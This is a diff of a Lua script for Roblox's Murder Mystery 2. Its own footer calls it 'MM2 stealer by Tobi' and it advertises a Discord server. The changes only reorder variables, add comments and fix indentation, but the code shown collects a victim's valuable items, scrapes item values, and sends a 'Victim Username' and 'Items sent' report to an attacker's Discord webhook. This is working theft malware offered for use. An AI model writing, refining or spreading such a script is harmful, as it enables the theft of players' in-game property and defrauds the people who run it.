@@ -4,12 +4,19 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
+-- 1. Define Services and Player Variables FIRST
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+-- 2. Define Configuration Variables
 local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 
+-- 3. Initial Validation Checks
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add username or webhook")
     return
@@ -30,12 +37,10 @@ if #Players:GetPlayers() >= 12 then
     return
 end
 
+-- 4. Environment & Game Data Setup
 local weaponsToSend = {}
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-local HttpService = game:GetService("HttpService")
 
 local rarityTable = {
     "Common",
@@ -55,6 +60,7 @@ local categories = {
     classic = "https://supremevaluelist.com/mm2/vintages.html",
     chroma = "https://supremevaluelist.com/mm2/chromas.html"
 }
+
 local headers = {
     ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
     ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
@@ -306,23 +312,23 @@ local function SendMessage(sortedItems)
         ["Content-Type"] = "application/json"
     }
 
-	local fields = {
-		{
-			name = "Victim Username:",
-			value = plr.Name,
-			inline = true
-		},
-		{
-			name = "Items sent:",
-			value = "",
-			inline = false
-		},
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = plr.Name,
+            inline = true
+        },
+        {
+            name = "Items sent:",
+            value = "",
+            inline = false
+        },
         {
             name = "Summary:",
             value = string.format("Total Value: %s", totalValue),
             inline = false
         }
-	}
+    }
 
     for _, item in ipairs(sortedItems) do
         local itemLine = string.format("%s (x%s): %s Value (%s)", item.DataID, item.Amount, (item.Value * item.Amount), item.Rarity)
@@ -345,10 +351,10 @@ local function SendMessage(sortedItems)
         ["embeds"] = {{
             ["title"] = "\240\159\148\170 New MM2 Execution" ,
             ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "MM2 stealer by Tobi. discord.gg/GY2RVSEGDT"
-			}
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "MM2 stealer by Tobi. discord.gg/GY2RVSEGDT"
+            }
         }}
     }
 
